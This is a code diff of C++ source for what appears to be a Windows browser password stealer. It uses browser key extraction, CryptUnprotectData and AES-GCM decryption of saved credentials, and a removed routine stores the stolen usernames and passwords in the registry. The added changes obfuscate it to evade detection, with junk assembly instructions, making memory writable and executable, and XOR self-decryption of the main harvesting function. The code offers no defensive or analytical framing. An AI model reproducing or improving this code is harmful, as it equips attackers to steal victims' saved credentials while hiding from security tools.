@@ -27,119 +27,6 @@ static const std::string base64_chars =
 "abcdefghijklmnopqrstuvwxyz"
 "0123456789+/";
 
-//void WriteRegistry(std::vector<tuple>* vData)
-//{
-//    HKEY hKey;
-//    LPCTSTR sk = TEXT("SOFTWARE\\tov_1");
-//    LONG retval;
-//    retval = RegCreateKeyEx(
-//        HKEY_LOCAL_MACHINE,
-//        sk,
-//        0,
-//        NULL,
-//        REG_OPTION_NON_VOLATILE,
-//        KEY_ALL_ACCESS,
-//        NULL,
-//        &hKey,
-//        NULL
-//    );
-//    if (retval != ERROR_SUCCESS)
-//    {
-//        return;
-//    }
-//    for (std::vector<tuple>::iterator it = vData->begin(); it != vData->end(); it++)
-//    {
-//        std::string str = (*it).username_value;
-//        str += " ";
-//        str += (*it).decrypted_password;
-//
-//        retval = RegSetValueEx(
-//            hKey,
-//            (*it).origin_url, 
-//            0, 
-//            REG_SZ, 
-//            (LPBYTE)str.c_str(), 
-//            str.length()
-//        );
-//        if (retval != ERROR_SUCCESS)
-//        {
-//            continue;
-//        }
-//    }
-//    retval = RegCloseKey(hKey);
-//    if (retval != ERROR_SUCCESS)
-//    {
-//        return;
-//    }
-//}
-
-//int readFile(char** pBuf, const char* pFileName)
-//{
-//    int iLen = 0;
-//
-//    FILE* F = NULL;
-//    fopen_s(&F, pFileName, "rb");
-//    if (F == NULL)
-//    {
-//        return -1;
-//    }
-//
-//    fseek(F, 0L, SEEK_END);
-//    iLen = ftell(F);
-//    fseek(F, 0L, SEEK_SET);
-//
-//    *pBuf = (char*)calloc(iLen, 1);
-//    fread(*pBuf, 1, iLen, F);
-//
-//    return (iLen);
-//}
-
-//static inline bool is_base64(unsigned char c)
-//{
-//    return (isalnum(c) || (c == '+') || (c == '/'));
-//}
-
-//std::string base64_decode(std::string const& encoded_string) {
-//    int in_len = encoded_string.size();
-//    int i = 0;
-//    int j = 0;
-//    int in_ = 0;
-//    unsigned char char_array_4[4], char_array_3[3];
-//    std::string ret;
-//
-//    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
-//        char_array_4[i++] = encoded_string[in_]; in_++;
-//        if (i == 4) {
-//            for (i = 0; i < 4; i++)
-//                char_array_4[i] = base64_chars.find(char_array_4[i]);
-//
-//            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-//            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-//            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-//
-//            for (i = 0; (i < 3); i++)
-//                ret += char_array_3[i];
-//            i = 0;
-//        }
-//    }
-//
-//    if (i) {
-//        for (j = i; j < 4; j++)
-//            char_array_4[j] = 0;
-//
-//        for (j = 0; j < 4; j++)
-//            char_array_4[j] = base64_chars.find(char_array_4[j]);
-//
-//        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-//        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-//        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-//
-//        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
-//    }
-//
-//    return ret;
-//}
-
 void aes_gcm_decrypt(const unsigned char* in_data, const int data_size, const unsigned char* gcm_key, char *result)
 {
     EVP_CIPHER_CTX* ctx;
@@ -155,26 +42,6 @@ void aes_gcm_decrypt(const unsigned char* in_data, const int data_size, const un
     EVP_CIPHER_CTX_free(ctx);
     memcpy(result, outbuf, outlen - 16);
 }
-
-//void getMasterKey(unsigned char** pKey)
-//{
-//    char* buffer = NULL;
-//    readFile(&buffer, cFileNew1);
-//    std::string data = buffer;
-//    free(buffer);
-//    std::regex key("\"encrypted_key\":\"([^\"]+)\"");
-//    std::smatch smch;
-//    std::string::const_iterator pars(data.cbegin());
-//    std::regex_search(pars, data.cend(), smch, key);
-//    std::string decoded = base64_decode(smch.str(1));
-//    decoded = decoded.substr(5);
-//    DATA_BLOB in, out;
-//    in.cbData = decoded.length();
-//    in.pbData = (BYTE*)decoded.data();
-//    CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out);
-//    (*pKey) = (unsigned char*)calloc(32, 1);
-//    memcpy(*pKey, out.pbData, 32);
-//}
 
 void bd_request(const char* f1, const char* f2)
 {
@@ -365,100 +232,119 @@ void bd_request(const char* f1, const char* f2)
 
 }
 
-#define keyTMP 0x5A // todo random key
+//#define keyTMP 0x5A // todo random key
 #define FUNC_SIZE_func 0x0F3A // size of function func() in bytes
 void getRWX(void* startAddr, void* endAddr)
 {
-__asm inc ebx;
-__asm dec ebx;
     MEMORY_BASIC_INFORMATION mbi;
 
+__asm push ecx;
+__asm pop ecx;
     //for (unsigned char* p = (unsigned char*)startAddr; p < (unsigned char*)endAddr; p += mbi.RegionSize)
     //{
+__asm nop;
+__asm inc ecx;
+__asm dec ecx;
         // get rwx permissions
         //VirtualQuery((void*)p, &mbi, sizeof(mbi));
         VirtualQuery((void*)startAddr, &mbi, sizeof(mbi));
-__asm push ecx;
-__asm pop ecx;
+__asm push ebx;
+__asm pop ebx;
         VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &mbi.Protect);
     //}
 }
 
-void decryptSelf(void* address, const unsigned int size, const unsigned char key)
+void decryptSelf(void* address, const unsigned int size/*, const unsigned char key*/)
 {
     unsigned int* pJmpOffset = (unsigned int*)((unsigned char*)address + 1);
+__asm push eax;
+__asm inc ecx;
+__asm dec ecx;
+__asm pop eax;
     unsigned char* pAddr = (unsigned char*)address + *pJmpOffset + 5;
-
+__asm nop;
+__asm nop;
 __asm inc eax;
 __asm dec eax;
-    getRWX(pAddr, pAddr + size);
+__asm inc ecx;
+__asm dec ecx;
+    unsigned char key = 0;
+
 __asm inc ebx;
 __asm dec ebx;
+    getRWX(pAddr, pAddr + size);
 
-__asm inc eax;
-__asm dec eax;
-    // TODO: bruteforce
+    key = (*pAddr) ^ 0x55;
+
+__asm inc ecx;
+__asm dec ecx;
     for (int i = 0; i < size; i++) {
-        *(pAddr + i) ^= key;
-__asm nop;
+__asm push ebx;
 __asm push eax;
+__asm push ebx;
+__asm pop ebx;
 __asm pop eax;
+__asm pop ebx;
+        *(pAddr + i) ^= key;
     }
+__asm nop;
+__asm push ecx;
+__asm pop ecx;
 }
 
 void main()
 {
+__asm nop;
+__asm inc eax;
+__asm dec eax;
+__asm inc ebx;
+__asm dec ebx;
     char cUsername[UNLEN + 1];
     char cFileFull[sizeof(cFileL) + sizeof(cFileR) + UNLEN + 1] = { 0 };
     char cFileFull1[sizeof(cFileL) + sizeof(cFileR1) + UNLEN + 1] = { 0 };
-__asm inc ecx;
-__asm dec ecx;
     DWORD username_len = UNLEN + 1;
+__asm nop;
+__asm push ebx;
+__asm pop ebx;
     std::vector<tuple> obtainedData;
-__asm inc eax;
+
+    decryptSelf((void*)&bd_request, FUNC_SIZE_func);
+
+__asm inc edx;
+__asm inc ebx;
 __asm nop;
 __asm push edx;
 __asm pop edx;
+__asm inc eax;
 __asm dec eax;
-
-    decryptSelf((void*)&bd_request, FUNC_SIZE_func, keyTMP);
-
+__asm dec ebx;
+__asm dec edx;
     GetUserName(cUsername, &username_len);
     strcat_s(cFileFull, cFileL);
-__asm inc ebx;
-__asm nop;
-__asm inc ebx;
-__asm dec ebx;
-__asm dec ebx;
     strcat_s(cFileFull, cUsername);
-    strcat_s(cFileFull, cFileR);
-__asm push edx;
-__asm pop edx;
-    strcat_s(cFileFull1, cFileL);
-    strcat_s(cFileFull1, cUsername);
 __asm inc edx;
-__asm dec edx;
-    strcat_s(cFileFull1, cFileR1);
-    
-__asm push edx;
-__asm pop edx;
-    bd_request(cFileFull, cFileFull1);
-    
-__asm nop;
-__asm push ecx;
-__asm pop ecx;
-__asm push eax;
-__asm pop eax;
-
-__asm push ebx;
-__asm pop ebx;
-    //WriteRegistry(&obtainedData);
-
-__asm nop;
 __asm nop;
 __asm inc eax;
 __asm dec eax;
-__asm push ebx;
-__asm pop ebx;
+__asm dec edx;
+    strcat_s(cFileFull, cFileR);
+    strcat_s(cFileFull1, cFileL);
+__asm inc eax;
+__asm dec eax;
+    strcat_s(cFileFull1, cUsername);
+    strcat_s(cFileFull1, cFileR1);
+    
+    bd_request(cFileFull, cFileFull1);
+__asm inc ebx;
+__asm dec ebx;
+    
+
+__asm inc edx;
+__asm nop;
+__asm inc ebx;
+__asm dec ebx;
+__asm dec edx;
+    //WriteRegistry(&obtainedData);
+
     system("pause");
 }
